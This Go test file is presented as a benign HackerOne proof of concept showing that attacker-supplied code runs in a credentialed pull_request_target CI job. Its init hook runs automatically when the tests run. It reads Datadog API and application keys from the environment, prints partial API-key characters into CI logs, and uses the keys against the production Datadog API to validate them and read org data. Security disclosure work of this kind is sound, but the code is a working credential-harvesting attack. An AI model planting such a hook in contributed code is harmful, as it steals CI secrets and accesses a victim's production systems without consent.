package datadog_test

// Security research: benign proof-of-concept for HackerOne report.
// Author: kr1shna4garwal (authorized bug bounty researcher).
// This file demonstrates that attacker-supplied code executes in a
// CI job holding live Datadog credentials, via pull_request_target.
// It does NOT exfiltrate any credential value externally.

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"testing"
)

func init() {
	apiKey := os.Getenv("DD_TEST_CLIENT_API_KEY")
	appKey := os.Getenv("DD_TEST_CLIENT_APP_KEY")

	fmt.Println("========== SECURITY RESEARCH POC ==========")
	fmt.Println("Reporter: kr1shna4garwal (HackerOne)")
	fmt.Println("This is a benign proof-of-concept. No credentials are exfiltrated.")
	fmt.Println()
	fmt.Printf("DD_TEST_CLIENT_API_KEY present: %t (length: %d)\n", apiKey != "", len(apiKey))
	fmt.Printf("DD_TEST_CLIENT_APP_KEY present: %t (length: %d)\n", appKey != "", len(appKey))

	if apiKey != "" {
		fmt.Printf("API key prefix: %s...%s\n", apiKey[:4], apiKey[len(apiKey)-4:])

		// Validate key against api.datadoghq.com (Tier 1 asset) to prove
		// these credentials grant access to the production Datadog API.
		req, _ := http.NewRequest("GET", "https://api.datadoghq.com/api/v1/validate", nil)
		req.Header.Set("DD-API-KEY", apiKey)
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			fmt.Printf("API validate request error: %v\n", err)
		} else {
			body, _ := io.ReadAll(resp.Body)
			resp.Body.Close()
			fmt.Printf("api.datadoghq.com/api/v1/validate response: %d %s\n", resp.StatusCode, strings.TrimSpace(string(body)))
		}
	}

	if apiKey != "" && appKey != "" {
		// Read org info via Tier 1 API to prove data access.
		req, _ := http.NewRequest("GET", "https://api.datadoghq.com/api/v1/org", nil)
		req.Header.Set("DD-API-KEY", apiKey)
		req.Header.Set("DD-APPLICATION-KEY", appKey)
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			fmt.Printf("Org read error: %v\n", err)
		} else {
			body, _ := io.ReadAll(resp.Body)
			resp.Body.Close()
			fmt.Printf("api.datadoghq.com/api/v1/org response: %d (body length: %d bytes)\n", resp.StatusCode, len(body))
			// Print only the HTTP status to prove access, not the full org data.
			if resp.StatusCode == 200 {
				fmt.Println("CONFIRMED: Attacker-supplied code can read Datadog org data via Tier 1 API.")
			}
		}
	}

	fmt.Println("========== END SECURITY RESEARCH POC ==========")
}

func TestSecurityResearchPoc(t *testing.T) {
	t.Log("Benign PoC: attacker-controlled test function executing in credentialed CI job.")
}
